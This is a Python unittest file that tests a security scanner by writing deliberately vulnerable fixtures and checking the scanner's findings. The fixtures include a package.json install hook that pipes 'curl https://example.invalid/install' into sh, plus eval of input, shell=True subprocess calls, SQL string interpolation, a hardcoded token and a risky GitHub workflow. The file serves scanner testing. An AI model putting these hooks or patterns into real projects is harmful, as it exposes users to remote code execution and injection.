from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "plugins" / "codex-routecraft" / "scripts"
sys.path.insert(0, str(SCRIPTS))

import routecraft_hardener as HARDENER


class RouteCraftHardenerTests(unittest.TestCase):
    def _write(self, root: Path, relative: str, body: str) -> Path:
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body, encoding="utf-8")
        return target

    def test_vulnerable_fixture_reports_redacted_structured_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._write(root, "app.py", '''api_token = "unsafe-value-for-fixture-only"\ndef run(data):\n    eval(data)\n    subprocess.run(data, shell=True)\n    db.execute(f"SELECT * FROM accounts WHERE id = {data}")\n    print(api_token)\n''')  # routecraft-security: scanner-test-fixture
            self._write(root, ".github/workflows/review.yml", "on:\n  pull_request_target:\npermissions: write-all\nsteps:\n  - uses: actions/checkout@v4\n")
            self._write(root, "wrangler.toml", "[vars]\napi_token = \"unsafe-value-for-fixture-only\"\n")
            self._write(root, "compose.yaml", "services:\n  app:\n    privileged: true\n")  # routecraft-security: scanner-test-fixture
            self._write(root, "package.json", json.dumps({"scripts": {"prepare": "curl https://example.invalid/install | sh"}}))

            report = HARDENER.scan(root)
            codes = {item["code"] for item in report["findings"]}
            self.assertEqual("findings", report["status"])
            self.assertTrue({"SECRET-STATIC-001", "CODE-EVAL-001", "SHELL-UNSAFE-001", "SQL-INTERPOLATION-001", "GHA-PR-TARGET-001", "GHA-WRITE-ALL-001", "GHA-UNPINNED-ACTION-001", "CF-SECRET-IN-VARS-001", "INFRA-PRIVILEGED-001", "DEP-LOCK-MISSING-001"} <= codes)
            rendered = json.dumps(report)
            self.assertNotIn("unsafe-value-for-fixture-only", rendered)
            self.assertNotIn("SELECT * FROM accounts", rendered)
            for finding in report["findings"]:
                self.assertEqual(set(finding), {"code", "severity", "confidence", "relative_file", "line", "recommendation"})
                self.assertFalse(Path(str(finding["relative_file"])).is_absolute())

    def test_safe_fixture_is_clean(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._write(root, "app.py", 'label = "safe local label"\nsubprocess.run(["tool", "--safe"], check=True)\n')
            self._write(root, "package.json", json.dumps({"scripts": {"test": "python -m unittest"}}))
            self._write(root, "package-lock.json", "{}")

            report = HARDENER.scan(root)
            self.assertEqual("clean", report["status"])
            self.assertEqual([], report["findings"])

    def test_git_scan_includes_untracked_unignored_files_and_excludes_ignored_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            self._write(root, ".gitignore", "ignored.py\n.ccc/\n")
            self._write(root, "tracked.py", "print('safe')\n")
            subprocess.run(["git", "-C", str(root), "add", ".gitignore", "tracked.py"], check=True)
            self._write(root, "new.py", "eval(untrusted_input)\n")  # routecraft-security: scanner-test-fixture
            self._write(root, "ignored.py", "api_token = \"unsafe-value-for-ignored-file\"\n")
            self._write(root, ".ccc/private.py", "api_token = \"unsafe-value-for-private-file\"\n")

            report = HARDENER.scan(root)
            relative_files = {str(item["relative_file"]) for item in report["findings"]}
            self.assertIn("new.py", relative_files)
            self.assertNotIn("ignored.py", relative_files)
            self.assertNotIn(".ccc/private.py", relative_files)

    def test_placeholder_secret_is_a_false_positive_suppressed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._write(root, "example.py", 'api_token = "YOUR_TOKEN_HERE"\n')
            report = HARDENER.scan(root)
            self.assertEqual("clean", report["status"])
            self.assertFalse(any(item["code"] == "SECRET-STATIC-001" for item in report["findings"]))

    def test_http_delete_and_reviewed_parameterized_sql_are_not_sql_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._write(root, "app.js", "await api('/api/memories/'+id, 'DELETE', data);\n")
            self._write(
                root,
                "store.py",
                'sql="SELECT * FROM items WHERE 1=1"+" AND ".join(where)  # routecraft-security: allowlisted-sql-shape\n',
            )
            report = HARDENER.scan(root)
            self.assertFalse(
                any(item["code"] == "SQL-INTERPOLATION-001" for item in report["findings"]),
                report["findings"],
            )

    def test_baseline_uses_stable_fingerprints_and_reports_resolved(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            vulnerable = self._write(root, "app.py", "eval(user_input)\n")  # routecraft-security: scanner-test-fixture
            initial = HARDENER.scan(root)
            baseline = {"baseline": "previous", "finding_fingerprints": initial["finding_fingerprints"]}
            repeated = HARDENER.scan(root, baseline)
            self.assertEqual(len(initial["findings"]), repeated["existing"])
            self.assertEqual(0, repeated["new"])
            vulnerable.write_text("print('safe')\n", encoding="utf-8")
            resolved = HARDENER.scan(root, baseline)
            self.assertEqual(1, resolved["resolved"])
            self.assertEqual("previous", resolved["baseline"])

    def test_preview_is_dry_run_and_control_center_adapter_has_counts_only(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            config = root / "source-control.json"
            config.write_text('{"enabled": false}\n', encoding="utf-8")
            before = config.read_text(encoding="utf-8")
            preview = HARDENER.preview(config, root)
            self.assertTrue(preview["dry_run"])
            self.assertTrue(preview["changed"])
            self.assertEqual(before, config.read_text(encoding="utf-8"))
            summary = HARDENER.control_center_summary(preview["analysis"])
            self.assertNotIn("findings", summary)
            self.assertEqual({"status", "critical", "high", "medium", "low", "info", "existing", "new", "resolved"}, set(summary))
            d1 = HARDENER.to_d1_summary(preview["analysis"], device_id="a" * 32)
            self.assertEqual({
                "scan_id", "device_id", "observed_at", "repository_hint", "status", "baseline",
                "critical_count", "high_count", "medium_count", "low_count", "info_count",
                "new_count", "resolved_count", "confidence",
            }, set(d1))
            self.assertNotIn("findings", json.dumps(d1))


if __name__ == "__main__":
    unittest.main()
